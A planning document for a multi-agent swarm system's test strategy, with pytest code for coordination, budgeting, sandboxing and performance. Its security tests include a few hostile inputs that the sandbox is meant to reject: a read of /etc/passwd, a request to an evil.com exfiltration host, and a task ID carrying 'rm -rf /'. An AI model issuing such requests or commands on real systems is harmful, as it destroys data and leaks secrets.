# Integration Test Strategy: Phase 0 and Beyond

**Status:** Planning Document - Test Strategy for S² Architecture
**Date:** 2025-11-12
**Scope:** Phase 0 (IF.coordinator + IF.governor + IF.chassis) through Phase 6
**Context:** Based on S2-CRITICAL-BUGS-AND-FIXES.md critical bug analysis

---

## Executive Summary

This document defines a **5-level testing strategy** for the S² (Swarm of Swarms) architecture, with specific focus on validating the 3 critical bug fixes identified in Phase 0:

1. **IF.coordinator** - Real-time coordination (<10ms latency, atomic operations)
2. **IF.governor** - Capability-aware resource allocation (budget enforcement)
3. **IF.chassis** - Security and performance isolation (WASM sandbox)

**Testing Philosophy:** Progressive validation from unit → integration → E2E → security → performance, with automated regression testing and CI/CD integration.

**Success Criteria:**
- ✅ <10ms coordinator latency (99th percentile)
- ✅ Zero race conditions in task claiming
- ✅ 100% circuit breaker activation on budget overrun
- ✅ 70%+ capability match enforcement
- ✅ Resource isolation prevents noisy neighbor attacks
- ✅ All security boundaries validated

---

## 1. Test Levels

### Level 1: Unit Tests

**Scope:** Individual component functionality in isolation

**Components Under Test:**
- `IF.coordinator` - Atomic operations, task queuing, swarm registration
- `IF.governor` - Capability matching, budget tracking, circuit breakers
- `IF.chassis` - WASM sandbox, resource limits, credential scoping

**Test Framework:** pytest + pytest-asyncio (Python), wasmer-test (WASM)

**Coverage Target:** 90%+ code coverage per component

**Test Categories:**

#### IF.coordinator Unit Tests
```python
# tests/unit/test_coordinator.py

import pytest
import asyncio
from infrafabric.coordinator import IFCoordinator

@pytest.mark.asyncio
async def test_atomic_task_claiming():
    """CRITICAL: Ensure two swarms cannot claim same task (Bug #1 fix)"""
    coordinator = IFCoordinator(etcd_host='localhost', etcd_port=2379)

    # Register two swarms
    await coordinator.register_swarm('swarm-1', capabilities=['code:rust'])
    await coordinator.register_swarm('swarm-2', capabilities=['code:rust'])

    # Both try to claim same task simultaneously
    task_id = 'task-abc123'
    coordinator.etcd.put(f'/tasks/{task_id}/owner', 'unclaimed')

    results = await asyncio.gather(
        coordinator.claim_task('swarm-1', task_id),
        coordinator.claim_task('swarm-2', task_id)
    )

    # EXACTLY one should succeed
    assert sum(results) == 1, "Atomic CAS failed - both claimed task!"

    # Verify etcd state
    owner = coordinator.etcd.get(f'/tasks/{task_id}/owner')[0].decode()
    assert owner in ['swarm-1', 'swarm-2']


@pytest.mark.asyncio
async def test_push_latency_under_10ms():
    """CRITICAL: Ensure <10ms push latency (Bug #1 fix)"""
    coordinator = IFCoordinator()
    queue = await coordinator.register_swarm('swarm-test', [])

    import time
    task = {'id': 'test-task', 'action': 'noop'}

    start = time.perf_counter()
    await coordinator.push_task_to_swarm('swarm-test', task)
    end = time.perf_counter()

    latency_ms = (end - start) * 1000
    assert latency_ms < 10, f"Latency {latency_ms}ms exceeds 10ms SLO"


@pytest.mark.asyncio
async def test_blocker_detection_immediate():
    """CRITICAL: Blocker detection must be immediate, not 30s delayed"""
    coordinator = IFCoordinator()
    orchestrator_queue = await coordinator.register_swarm('orchestrator', [])

    import time
    start = time.perf_counter()

    await coordinator.detect_blocker(
        swarm_id='session-4-sip',
        blocker_info={'reason': 'missing_dependency', 'details': '...'}
    )

    # Check orchestrator received notification
    blocker_event = await asyncio.wait_for(orchestrator_queue.get(), timeout=0.1)
    end = time.perf_counter()

    assert blocker_event['type'] == 'blocker_detected'
    latency_ms = (end - start) * 1000
    assert latency_ms < 10, f"Blocker notification took {latency_ms}ms"


@pytest.mark.asyncio
async def test_scalability_1000_swarms():
    """Coordinator must handle 1000+ concurrent swarms"""
    coordinator = IFCoordinator()

    # Register 1000 swarms in parallel
    tasks = [
        coordinator.register_swarm(f'swarm-{i}', [f'cap-{i % 10}'])
        for i in range(1000)
    ]
    await asyncio.gather(*tasks)

    # Verify all registered
    assert len(coordinator.swarm_connections) == 1000
```

#### IF.governor Unit Tests
```python
# tests/unit/test_governor.py

import pytest
from infrafabric.governor import IFGovernor, ResourcePolicy, SwarmProfile, Capability

def test_capability_matching_70_percent():
    """CRITICAL: Ensure 70%+ capability match required (Bug #2 fix)"""
    policy = ResourcePolicy(min_capability_match=0.7)
    governor = IFGovernor(coordinator=None, policy=policy)

    # Register swarm with specific capabilities
    profile = SwarmProfile(
        swarm_id='session-1-ndi',
        capabilities=[Capability.INTEGRATION_NDI, Capability.CODE_ANALYSIS_PYTHON],
        cost_per_hour=2.0,
        reputation_score=0.9,
        current_budget_remaining=10.0
    )
    governor.register_swarm(profile)

    # Task requires NDI + WebRTC (50% match - SHOULD REJECT)
    swarm = governor.find_qualified_swarm(
        required_capabilities=[Capability.INTEGRATION_NDI, Capability.INTEGRATION_WEBRTC],
        max_cost=5.0
    )
    assert swarm is None, "Should reject 50% capability match"

    # Task requires NDI + Python (100% match - SHOULD ACCEPT)
    swarm = governor.find_qualified_swarm(
        required_capabilities=[Capability.INTEGRATION_NDI, Capability.CODE_ANALYSIS_PYTHON],
        max_cost=5.0
    )
    assert swarm == 'session-1-ndi', "Should accept 100% capability match"


def test_circuit_breaker_on_budget_exhausted():
    """CRITICAL: Circuit breaker must trip when budget exhausted (Bug #2 fix)"""
    policy = ResourcePolicy(max_cost_per_task=10.0)
    governor = IFGovernor(coordinator=None, policy=policy)

    profile = SwarmProfile(
        swarm_id='swarm-expensive',
        capabilities=[Capability.CODE_ANALYSIS_RUST],
        cost_per_hour=20.0,
        reputation_score=1.0,
        current_budget_remaining=5.0
    )
    governor.register_swarm(profile)

    # Consume budget
    governor.track_cost('swarm-expensive', 'operation-1', 5.0)

    # Budget should be exhausted
    assert profile.current_budget_remaining == 0.0

    # Swarm should no longer be findable
    swarm = governor.find_qualified_swarm(
        required_capabilities=[Capability.CODE_ANALYSIS_RUST],
        max_cost=100.0
    )
    assert swarm is None, "Circuit breaker did not trip!"


def test_max_swarms_per_task_enforcement():
    """Prevent 'too many cooks' syndrome (Bug #2 fix)"""
    policy = ResourcePolicy(max_swarms_per_task=3)
    governor = IFGovernor(coordinator=None, policy=policy)

    # Register 10 swarms
    for i in range(10):
        governor.register_swarm(SwarmProfile(
            swarm_id=f'swarm-{i}',
            capabilities=[Capability.CODE_ANALYSIS_PYTHON],
            cost_per_hour=2.0,
            reputation_score=1.0,
            current_budget_remaining=10.0
        ))

    # Request help - should return MAX 3 swarms
    assigned = asyncio.run(governor.request_help_for_blocker(
        blocked_swarm_id='session-4-sip',
        blocker_description={'required_capabilities': ['code-analysis:python']}
    ))

    assert len(assigned) <= 3, f"Too many swarms assigned: {len(assigned)}"


def test_reputation_based_selection():
    """Higher reputation swarms should be prioritized"""
    governor = IFGovernor(coordinator=None, policy=ResourcePolicy())

    # Two swarms, identical except reputation
    governor.register_swarm(SwarmProfile(
        swarm_id='swarm-low-rep',
        capabilities=[Capability.CODE_ANALYSIS_RUST],
        cost_per_hour=2.0,
        reputation_score=0.5,
        current_budget_remaining=10.0
    ))

    governor.register_swarm(SwarmProfile(
        swarm_id='swarm-high-rep',
        capabilities=[Capability.CODE_ANALYSIS_RUST],
        cost_per_hour=2.0,
        reputation_score=0.95,
        current_budget_remaining=10.0
    ))

    # Should select high-reputation swarm
    selected = governor.find_qualified_swarm(
        required_capabilities=[Capability.CODE_ANALYSIS_RUST],
        max_cost=5.0
    )
    assert selected == 'swarm-high-rep', "Failed to prioritize high-reputation swarm"
```

#### IF.chassis Unit Tests
```python
# tests/unit/test_chassis.py

import pytest
import resource
from infrafabric.chassis import IFChassis, ResourceLimits, ServiceContract, ScopedCredentials

@pytest.mark.asyncio
async def test_memory_isolation_enforcement():
    """CRITICAL: Swarm cannot exceed memory limit (Bug #3 fix)"""
    chassis = IFChassis()

    contract = ServiceContract(
        swarm_id='swarm-test',
        capabilities=['code:python'],
        resource_requirements=ResourceLimits(max_memory_mb=256),
        slos=None,
        version='1.0'
    )

    # Load swarm with 256MB limit
    # (WASM module that tries to allocate 512MB)
    with pytest.raises(MemoryError):
        await chassis.execute_task(
            swarm_id='swarm-test',
            task={'action': 'allocate_512mb'},
            credentials=None
        )


@pytest.mark.asyncio
async def test_scoped_credentials_expiration():
    """CRITICAL: Credentials must expire after TTL (Bug #3 fix)"""
    import time

    creds = ScopedCredentials(
        swarm_id='swarm-test',
        task_id='task-123',
        api_token='temp-token-abc',
        ttl_seconds=1,
        allowed_endpoints=['https://api.openai.com/v1/chat/completions']
    )
    creds.created_at = time.time()

    # Should be valid immediately
    assert not creds.is_expired

    # Wait for expiration
    time.sleep(1.1)

    # Should be expired
    assert creds.is_expired, "Scoped credentials did not expire!"


@pytest.mark.asyncio
async def test_rate_limiting_prevents_noisy_neighbor():
    """CRITICAL: One swarm cannot exhaust API rate limit (Bug #3 fix)"""
    chassis = IFChassis()

    # Configure 10 API calls/sec limit per swarm
    # Swarm-A tries to make 100 calls in 1 second

    start = time.time()
    for i in range(100):
        await chassis._apply_rate_limit('swarm-a')
    end = time.time()

    duration = end - start
    # With 10 req/sec limit, 100 calls should take ~10 seconds
    assert duration >= 9.5, f"Rate limiting ineffective: {duration}s for 100 calls"


def test_slo_reputation_calculation():
    """Swarms violating SLO should have reduced reputation"""
    chassis = IFChassis()
    swarm_id = 'swarm-test'

    # Define SLO: 95% success rate, p99 latency < 500ms
    contract = ServiceContract(
        swarm_id=swarm_id,
        capabilities=[],
        resource_requirements=ResourceLimits(),
        slos=ServiceLevelObjective(
            p99_latency_ms=500,
            success_rate=0.95,
            availability=0.99
        ),
        version='1.0'
    )

    # Simulate 100 executions: 90 success, 10 failure (90% success)
    for i in range(90):
        chassis._track_performance(swarm_id, latency_ms=300, success=True)
    for i in range(10):
        chassis._track_performance(swarm_id, latency_ms=None, success=False)

    # Reputation should be penalized (< 1.0)
    reputation = chassis._calculate_reputation(swarm_id)
    assert reputation < 0.95, f"Reputation {reputation} not penalized for SLO violation"
```

**Execution:**
```bash
# Run all unit tests
pytest tests/unit/ -v --cov=src/infrafabric --cov-report=html

# Run specific component
pytest tests/unit/test_coordinator.py -v
pytest tests/unit/test_governor.py -v
pytest tests/unit/test_chassis.py -v

# Run with markers
pytest tests/unit/ -m critical -v  # Only critical tests
pytest tests/unit/ -m performance -v  # Only performance tests
```

---

### Level 2: Integration Tests

**Scope:** Multi-component interactions and cross-system flows

**Test Categories:**

#### Cross-Component Integration
```python
# tests/integration/test_coordinator_governor_integration.py

@pytest.mark.asyncio
async def test_full_gang_up_on_blocker_workflow():
    """
    CRITICAL E2E: Test Bug #1 + Bug #2 fixes working together

    Scenario:
    1. Session 4 (SIP) blocks on complex integration
    2. IF.coordinator detects blocker (<10ms)
    3. IF.governor finds qualified help (70%+ capability match)
    4. IF.chassis executes help tasks (sandboxed)
    5. Blocker resolved, budget not exceeded
    """
    # Setup
    coordinator = IFCoordinator()
    governor = IFGovernor(coordinator=coordinator, policy=ResourcePolicy(
        max_swarms_per_task=3,
        max_cost_per_task=10.0,
        min_capability_match=0.7
    ))
    chassis = IFChassis()

    # Register swarms with capabilities
    swarms = [
        ('session-1-ndi', [Capability.INTEGRATION_NDI]),
        ('session-2-webrtc', [Capability.INTEGRATION_WEBRTC]),
        ('session-4-sip', [Capability.INTEGRATION_SIP]),
        ('session-6-talent', [Capability.ARCHITECTURE_PATTERNS]),  # Wrong expertise
    ]

    for swarm_id, caps in swarms:
        await coordinator.register_swarm(swarm_id, caps)
        governor.register_swarm(SwarmProfile(
            swarm_id=swarm_id,
            capabilities=caps,
            cost_per_hour=2.0,
            reputation_score=1.0,
            current_budget_remaining=10.0
        ))

    # Session 4 blocks - needs SIP + NDI help
    import time
    start = time.perf_counter()

    await coordinator.detect_blocker(
        swarm_id='session-4-sip',
        blocker_info={
            'reason': 'sip_ndi_integration_failure',
            'required_capabilities': ['integration:sip', 'integration:ndi']
        }
    )

    # Governor finds qualified help
    assigned_swarms = await governor.request_help_for_blocker(
        blocked_swarm_id='session-4-sip',
        blocker_description={
            'required_capabilities': [Capability.INTEGRATION_SIP, Capability.INTEGRATION_NDI]
        }
    )

    end = time.perf_counter()
    latency_ms = (end - start) * 1000

    # ASSERTIONS
    assert latency_ms < 50, f"Total coordination took {latency_ms}ms (target: <50ms)"
    assert len(assigned_swarms) <= 3, "Too many swarms assigned"
    assert 'session-1-ndi' in assigned_swarms, "NDI expert not assigned"
    assert 'session-6-talent' not in assigned_swarms, "Unqualified swarm incorrectly assigned"

    # Verify budget not exceeded
    for swarm_id in assigned_swarms:
        profile = governor.swarm_registry[swarm_id]
        assert profile.current_budget_remaining >= 0, f"{swarm_id} budget overrun"


@pytest.mark.asyncio
async def test_noisy_neighbor_isolation():
    """
    CRITICAL: Buggy swarm cannot starve others (Bug #3 fix)

    Scenario:
    1. Swarm-7 enters infinite loop, exhausts its rate limit
    2. Other swarms (1-6) continue working normally
    3. Chassis rate limiting prevents API exhaustion
    """
    chassis = IFChassis()

    # Load 7 swarms with individual rate limits (10 req/sec each)
    for i in range(1, 8):
        contract = ServiceContract(
            swarm_id=f'swarm-{i}',
            capabilities=[],
            resource_requirements=ResourceLimits(max_api_calls_per_second=10),
            slos=None,
            version='1.0'
        )
        chassis.load_swarm(f'swarm-{i}', wasm_module=b'...', contract=contract)

    # Swarm-7 goes crazy (100 req/sec)
    async def noisy_swarm():
        for _ in range(100):
            await chassis._apply_rate_limit('swarm-7')

    # Other swarms make normal requests
    async def normal_swarm(swarm_id):
        for _ in range(5):  # 5 requests in quick succession
            await chassis._apply_rate_limit(swarm_id)

    # Run in parallel
    start = time.time()
    await asyncio.gather(
        noisy_swarm(),
        normal_swarm('swarm-1'),
        normal_swarm('swarm-2'),
        normal_swarm('swarm-3'),
    )
    end = time.time()

    # Normal swarms should complete quickly (<1s)
    # Noisy swarm should be throttled (~10s)
    assert end - start < 2, "Normal swarms were starved by noisy neighbor!"
```

#### External Service Integration (with Mocks)
```python
# tests/integration/test_external_services.py

@pytest.mark.asyncio
async def test_etcd_backend_integration():
    """Test IF.coordinator with real etcd backend"""
    # Requires: docker run -d -p 2379:2379 quay.io/coreos/etcd

    coordinator = IFCoordinator(etcd_host='localhost', etcd_port=2379)

    # Test connectivity
    await coordinator.register_swarm('test-swarm', ['test:capability'])

    # Verify in etcd
    import etcd3
    etcd = etcd3.client(host='localhost', port=2379)
    value, _ = etcd.get('/swarms/test-swarm/capabilities')

    assert value is not None
    import json
    caps = json.loads(value.decode())
    assert 'test:capability' in caps


@pytest.mark.asyncio
async def test_nats_message_bus_integration():
    """Test IF.coordinator with NATS backend (alternative to etcd)"""
    # Requires: docker run -d -p 4222:4222 nats

    # TODO: NATS implementation
    pass


@pytest.mark.asyncio
async def test_openai_api_with_scoped_credentials():
    """Test IF.chassis scoped credentials with real OpenAI API"""
    chassis = IFChassis()

    # Create temporary, scoped credential
    creds = ScopedCredentials(
        swarm_id='test-swarm',
        task_id='test-task-123',
        api_token=os.getenv('OPENAI_API_KEY'),  # From environment
        ttl_seconds=300,
        allowed_endpoints=['https://api.openai.com/v1/chat/completions']
    )

    # Execute task with scoped creds
    result = await chassis.execute_task(
        swarm_id='test-swarm',
        task={'action': 'call_llm', 'prompt': 'Say "test"'},
        credentials=creds
    )

    assert result['status'] == 'success'
```

**Execution:**
```bash
# Run integration tests (requires infrastructure)
docker-compose up -d etcd nats  # Start dependencies
pytest tests/integration/ -v --tb=short

# Run with real services (slower)
pytest tests/integration/ -v --integration-real-services

# Run with mocks (fast)
pytest tests/integration/ -v --integration-mocked
```

---

### Level 3: End-to-End (E2E) Tests

**Scope:** Full S² deployment workflows, multi-session coordination

**Test Scenarios:**

```python
# tests/e2e/test_s2_deployment.py

@pytest.mark.e2e
@pytest.mark.slow
async def test_phase_0_full_deployment():
    """
    E2E: Deploy IF.coordinator + IF.governor + IF.chassis

    Timeline:
    1. Start infrastructure (etcd, monitoring)
    2. Deploy IF.coordinator
    3. Deploy IF.governor with policies
    4. Deploy IF.chassis with sample WASM modules
    5. Register 7 swarms (Sessions 1-7)
    6. Execute sample coordination workflow
    7. Verify all components working
    8. Teardown
    """
    # 1. Infrastructure
    subprocess.run(['docker-compose', 'up', '-d', 'etcd', 'prometheus', 'grafana'])
    await asyncio.sleep(5)  # Wait for startup

    # 2. Deploy coordinator
    coordinator = IFCoordinator(etcd_host='localhost', etcd_port=2379)
    assert coordinator.etcd.status()['healthy']

    # 3. Deploy governor with policy
    policy = ResourcePolicy(
        max_swarms_per_task=3,
        max_cost_per_task=10.0,
        min_capability_match=0.7
    )
    governor = IFGovernor(coordinator=coordinator, policy=policy)

    # 4. Deploy chassis
    chassis = IFChassis()

    # 5. Register 7 sessions
    sessions = [
        ('session-1-ndi', [Capability.INTEGRATION_NDI]),
        ('session-2-webrtc', [Capability.INTEGRATION_WEBRTC]),
        ('session-3-h323', []),
        ('session-4-sip', [Capability.INTEGRATION_SIP]),
        ('session-5-cli', [Capability.CLI_DESIGN]),
        ('session-6-talent', [Capability.ARCHITECTURE_PATTERNS]),
        ('session-7-bus', []),
    ]

    for swarm_id, caps in sessions:
        await coordinator.register_swarm(swarm_id, caps)
        governor.register_swarm(SwarmProfile(
            swarm_id=swarm_id,
            capabilities=caps,
            cost_per_hour=2.0,
            reputation_score=1.0,
            current_budget_remaining=50.0
        ))

    # 6. Execute coordination workflow
    # Session 4 blocks, needs help from Sessions 1-2
    assigned = await governor.request_help_for_blocker(
        blocked_swarm_id='session-4-sip',
        blocker_description={'required_capabilities': [
            Capability.INTEGRATION_SIP,
            Capability.INTEGRATION_NDI,
            Capability.INTEGRATION_WEBRTC
        ]}
    )

    # 7. Verify
    assert 'session-1-ndi' in assigned
    assert 'session-2-webrtc' in assigned
    assert len(assigned) <= 3

    # 8. Teardown
    subprocess.run(['docker-compose', 'down'])


@pytest.mark.e2e
async def test_7_session_parallel_execution():
    """
    E2E: Simulate 7 sessions working in parallel on independent tasks

    Measures:
    - Actual parallelization (should be ~7x faster than sequential)
    - Cost tracking accuracy
    - Zero race conditions
    """
    # TODO: Implement full 7-session simulation
    pass


@pytest.mark.e2e
async def test_gang_up_on_blocker_latency():
    """
    E2E: Measure end-to-end "Gang Up on Blocker" latency

    Target: <10ms detection + <50ms assignment = <60ms total
    Compare: 30,000ms+ with git polling (Bug #1 baseline)
    """
    # TODO: Implement blocker latency measurement
    pass
```

**Execution:**
```bash
# Run E2E tests (slow, requires full stack)
pytest tests/e2e/ -v --tb=short -m e2e

# Run with detailed logging
pytest tests/e2e/ -v -s --log-cli-level=DEBUG

# Run specific scenario
pytest tests/e2e/test_s2_deployment.py::test_phase_0_full_deployment -v
```

---

### Level 4: Security Tests

**Scope:** Validate all security boundaries and threat mitigations

**Security Audit Checklist:**

```python
# tests/security/test_security_boundaries.py

@pytest.mark.security
async def test_wasm_sandbox_filesystem_isolation():
    """CRITICAL: WASM sandbox must NOT access host filesystem"""
    chassis = IFChassis()

    # WASM module attempts to read /etc/passwd
    malicious_task = {
        'action': 'read_file',
        'path': '/etc/passwd'
    }

    with pytest.raises(PermissionError):
        await chassis.execute_task(
            swarm_id='malicious-swarm',
            task=malicious_task,
            credentials=None
        )


@pytest.mark.security
async def test_wasm_sandbox_network_isolation():
    """CRITICAL: WASM sandbox must NOT make arbitrary network requests"""
    chassis = IFChassis()

    # WASM module attempts to exfiltrate data
    malicious_task = {
        'action': 'http_request',
        'url': 'https://evil.com/exfiltrate',
        'data': 'stolen_api_keys'
    }

    with pytest.raises(PermissionError):
        await chassis.execute_task(
            swarm_id='malicious-swarm',
            task=malicious_task,
            credentials=None
        )


@pytest.mark.security
async def test_credential_scope_enforcement():
    """CRITICAL: Credentials must only work for allowed endpoints"""
    creds = ScopedCredentials(
        swarm_id='test',
        task_id='test',
        api_token='test-token',
        ttl_seconds=300,
        allowed_endpoints=['https://api.openai.com/v1/chat/completions']
    )

    # Allowed endpoint - should succeed
    assert creds.is_endpoint_allowed('https://api.openai.com/v1/chat/completions')

    # Disallowed endpoint - should fail
    assert not creds.is_endpoint_allowed('https://evil.com/steal')


@pytest.mark.security
async def test_etcd_authentication():
    """CRITICAL: etcd must require authentication"""
    # Attempt to connect without credentials
    with pytest.raises(AuthenticationError):
        coordinator = IFCoordinator(
            etcd_host='localhost',
            etcd_port=2379,
            etcd_username=None,  # No auth
            etcd_password=None
        )
        coordinator.etcd.status()


@pytest.mark.security
async def test_task_injection_prevention():
    """CRITICAL: Prevent malicious task injection"""
    coordinator = IFCoordinator()

    # Malicious task with code injection attempt
    malicious_task = {
        'id': 'task-123; rm -rf /',  # Command injection
        'action': 'execute'
    }

    # Should sanitize task ID
    with pytest.raises(ValueError):
        await coordinator.push_task_to_swarm('swarm-1', malicious_task)


@pytest.mark.security
async def test_budget_manipulation_prevention():
    """CRITICAL: Swarm cannot manipulate its own budget"""
    governor = IFGovernor(coordinator=None, policy=ResourcePolicy())

    profile = SwarmProfile(
        swarm_id='swarm-test',
        capabilities=[],
        cost_per_hour=2.0,
        reputation_score=1.0,
        current_budget_remaining=10.0
    )
    governor.register_swarm(profile)

    # Swarm attempts to increase its budget directly
    # This should be prevented by access controls
    original_budget = profile.current_budget_remaining

    # Only governor methods should modify budget
    governor.track_cost('swarm-test', 'operation', 5.0)
    assert profile.current_budget_remaining == 5.0

    # Direct manipulation should not be possible
    # (This is enforced by Python's encapsulation, but should be validated)
```

**Security Audit Checklist (Manual + Automated):**

| Security Control | Test | Status | Priority |
|-----------------|------|--------|----------|
| WASM sandbox filesystem isolation | `test_wasm_sandbox_filesystem_isolation` | ⬜ TODO | CRITICAL |
| WASM sandbox network isolation | `test_wasm_sandbox_network_isolation` | ⬜ TODO | CRITICAL |
| Scoped credential expiration | `test_scoped_credentials_expiration` | ⬜ TODO | CRITICAL |
| Scoped credential endpoint whitelist | `test_credential_scope_enforcement` | ⬜ TODO | CRITICAL |
| etcd authentication required | `test_etcd_authentication` | ⬜ TODO | HIGH |
| Task injection prevention | `test_task_injection_prevention` | ⬜ TODO | HIGH |
| Budget manipulation prevention | `test_budget_manipulation_prevention` | ⬜ TODO | HIGH |
| Rate limiting bypass prevention | `test_rate_limiting_bypass` | ⬜ TODO | MEDIUM |
| Reputation score manipulation | `test_reputation_manipulation` | ⬜ TODO | MEDIUM |
| Cross-swarm data leakage | `test_cross_swarm_isolation` | ⬜ TODO | HIGH |

**Execution:**
```bash
# Run all security tests
pytest tests/security/ -v -m security

# Generate security audit report
pytest tests/security/ --tb=short --security-report=security-audit.html

# Run penetration tests (requires special setup)
pytest tests/security/ -v -m penetration
```

---

### Level 5: Performance Tests

**Scope:** Validate performance benchmarks and scalability targets

**Performance Benchmarks:**

| Metric | Target | Current | Test |
|--------|--------|---------|------|
| Coordinator latency (p99) | <10ms | ⬜ TBD | `test_coordinator_latency_p99` |
| Task claiming latency | <5ms | ⬜ TBD | `test_task_claim_latency` |
| Blocker detection latency | <10ms | ⬜ TBD | `test_blocker_detection_latency` |
| Governor capability matching | <20ms | ⬜ TBD | `test_capability_matching_latency` |
| Chassis task execution overhead | <100ms | ⬜ TBD | `test_chassis_overhead` |
| Concurrent swarms supported | 1000+ | ⬜ TBD | `test_1000_concurrent_swarms` |
| Throughput (tasks/sec) | 1000+ | ⬜ TBD | `test_throughput_1000_tps` |
| Memory per swarm | <256MB | ⬜ TBD | `test_memory_footprint` |

```python
# tests/performance/test_benchmarks.py

import pytest
import time
import statistics

@pytest.mark.performance
@pytest.mark.asyncio
async def test_coordinator_latency_p99():
    """
    CRITICAL: Measure coordinator push latency (p99 < 10ms)

    Baseline (git polling): 30,000ms
    Target (IF.coordinator): <10ms
    Improvement: 3,000x
    """
    coordinator = IFCoordinator()
    await coordinator.register_swarm('swarm-test', [])

    latencies = []

    for i in range(1000):
        task = {'id': f'task-{i}', 'action': 'noop'}

        start = time.perf_counter()
        await coordinator.push_task_to_swarm('swarm-test', task)
        end = time.perf_counter()

        latencies.append((end - start) * 1000)  # ms

    p50 = statistics.quantiles(latencies, n=100)[49]
    p99 = statistics.quantiles(latencies, n=100)[98]
    avg = statistics.mean(latencies)

    print(f"\nCoordinator Latency:")
    print(f"  Average: {avg:.2f}ms")
    print(f"  p50: {p50:.2f}ms")
    print(f"  p99: {p99:.2f}ms")

    assert p99 < 10, f"p99 latency {p99:.2f}ms exceeds 10ms target"


@pytest.mark.performance
@pytest.mark.asyncio
async def test_1000_concurrent_swarms():
    """
    CRITICAL: Coordinator must handle 1000+ concurrent swarms

    Baseline (git polling): ~100 swarms (self-DDoS at scale)
    Target (IF.coordinator): 1000+ swarms
    Improvement: 10x scalability
    """
    coordinator = IFCoordinator()

    # Register 1000 swarms
    start = time.time()
    tasks = [
        coordinator.register_swarm(f'swarm-{i}', [f'cap-{i % 10}'])
        for i in range(1000)
    ]
    await asyncio.gather(*tasks)
    end = time.time()

    registration_time = end - start
    print(f"\n1000 swarm registration: {registration_time:.2f}s")

    assert len(coordinator.swarm_connections) == 1000
    assert registration_time < 10, f"Registration took {registration_time}s (too slow)"


@pytest.mark.performance
@pytest.mark.asyncio
async def test_throughput_1000_tasks_per_second():
    """
    Measure system throughput (target: 1000 tasks/sec)
    """
    coordinator = IFCoordinator()

    # Register 10 swarms
    for i in range(10):
        await coordinator.register_swarm(f'swarm-{i}', [])

    # Push 10,000 tasks as fast as possible
    start = time.time()
    tasks = []
    for i in range(10000):
        swarm = f'swarm-{i % 10}'
        task = {'id': f'task-{i}'}
        tasks.append(coordinator.push_task_to_swarm(swarm, task))

    await asyncio.gather(*tasks)
    end = time.time()

    duration = end - start
    throughput = 10000 / duration

    print(f"\nThroughput: {throughput:.0f} tasks/sec")

    assert throughput >= 1000, f"Throughput {throughput:.0f} tasks/sec < target 1000"


@pytest.mark.performance
def test_memory_footprint_per_swarm():
    """Each swarm should use <256MB memory"""
    import psutil
    import os

    process = psutil.Process(os.getpid())

    # Baseline memory
    baseline_mb = process.memory_info().rss / 1024 / 1024

    # Load 1 swarm
    chassis = IFChassis()
    contract = ServiceContract(
        swarm_id='swarm-test',
        capabilities=[],
        resource_requirements=ResourceLimits(max_memory_mb=256),
        slos=None,
        version='1.0'
    )
    chassis.load_swarm('swarm-test', wasm_module=b'...', contract=contract)

    # Measure memory delta
    after_mb = process.memory_info().rss / 1024 / 1024
    delta_mb = after_mb - baseline_mb

    print(f"\nMemory per swarm: {delta_mb:.2f} MB")

    assert delta_mb < 256, f"Swarm uses {delta_mb:.2f}MB (exceeds 256MB)"


@pytest.mark.performance
@pytest.mark.asyncio
async def test_capability_matching_latency():
    """Governor capability matching should be <20ms"""
    governor = IFGovernor(coordinator=None, policy=ResourcePolicy())

    # Register 100 swarms with various capabilities
    for i in range(100):
        governor.register_swarm(SwarmProfile(
            swarm_id=f'swarm-{i}',
            capabilities=[Capability(f'cap-{j}') for j in range(i % 10)],
            cost_per_hour=2.0,
            reputation_score=1.0,
            current_budget_remaining=10.0
        ))

    # Measure capability matching time
    latencies = []
    for i in range(100):
        start = time.perf_counter()
        governor.find_qualified_swarm(
            required_capabilities=[Capability('cap-1')],
            max_cost=5.0
        )
        end = time.perf_counter()
        latencies.append((end - start) * 1000)

    avg_latency = statistics.mean(latencies)
    print(f"\nCapability matching latency: {avg_latency:.2f}ms")

    assert avg_latency < 20, f"Matching latency {avg_latency:.2f}ms exceeds 20ms"
```

**Execution:**
```bash
# Run performance benchmarks
pytest tests/performance/ -v -m performance

# Generate performance report
pytest tests/performance/ --benchmark-only --benchmark-autosave

# Run with profiling
pytest tests/performance/ -v --profile

# Compare to baseline (git polling)
pytest tests/performance/test_benchmarks.py::test_coordinator_latency_p99 -v --baseline=git_polling
```

---

## 2. Test Data Fixtures

**Fixture Categories:**

### Coordinator Fixtures
```python
# tests/fixtures/coordinator_fixtures.py

import pytest
from infrafabric.coordinator import IFCoordinator

@pytest.fixture
async def coordinator():
    """Standalone coordinator instance"""
    coord = IFCoordinator(etcd_host='localhost', etcd_port=2379)
    yield coord
    # Cleanup
    coord.etcd.delete_prefix('/swarms/')
    coord.etcd.delete_prefix('/tasks/')


@pytest.fixture
async def coordinator_with_swarms():
    """Coordinator with 7 pre-registered swarms"""
    coord = IFCoordinator()

    swarms = [
        ('session-1-ndi', [Capability.INTEGRATION_NDI]),
        ('session-2-webrtc', [Capability.INTEGRATION_WEBRTC]),
        ('session-3-h323', []),
        ('session-4-sip', [Capability.INTEGRATION_SIP]),
        ('session-5-cli', [Capability.CLI_DESIGN]),
        ('session-6-talent', [Capability.ARCHITECTURE_PATTERNS]),
        ('session-7-bus', []),
    ]

    for swarm_id, caps in swarms:
        await coord.register_swarm(swarm_id, caps)

    yield coord

    # Cleanup
    coord.etcd.delete_prefix('/swarms/')


@pytest.fixture
def sample_tasks():
    """Sample task definitions"""
    return [
        {
            'id': 'task-ndi-streaming',
            'type': 'integration',
            'priority': 'high',
            'estimated_duration_sec': 3600,
            'required_capabilities': [Capability.INTEGRATION_NDI]
        },
        {
            'id': 'task-sip-bridge',
            'type': 'integration',
            'priority': 'critical',
            'estimated_duration_sec': 7200,
            'required_capabilities': [Capability.INTEGRATION_SIP, Capability.INTEGRATION_NDI]
        },
    ]
```

### Governor Fixtures
```python
# tests/fixtures/governor_fixtures.py

@pytest.fixture
def default_policy():
    """Standard resource policy"""
    return ResourcePolicy(
        max_swarms_per_task=3,
        max_cost_per_task=10.0,
        min_capability_match=0.7,
        circuit_breaker_failure_threshold=3
    )


@pytest.fixture
def swarm_profiles():
    """7 swarm profiles for S² testing"""
    return [
        SwarmProfile(
            swarm_id='session-1-ndi',
            capabilities=[Capability.INTEGRATION_NDI, Capability.CODE_ANALYSIS_PYTHON],
            cost_per_hour=2.0,
            reputation_score=0.95,
            current_budget_remaining=50.0
        ),
        # ... 6 more
    ]


@pytest.fixture
def blocker_scenarios():
    """Sample blocker scenarios for testing"""
    return [
        {
            'name': 'sip_integration_blocked',
            'blocked_swarm': 'session-4-sip',
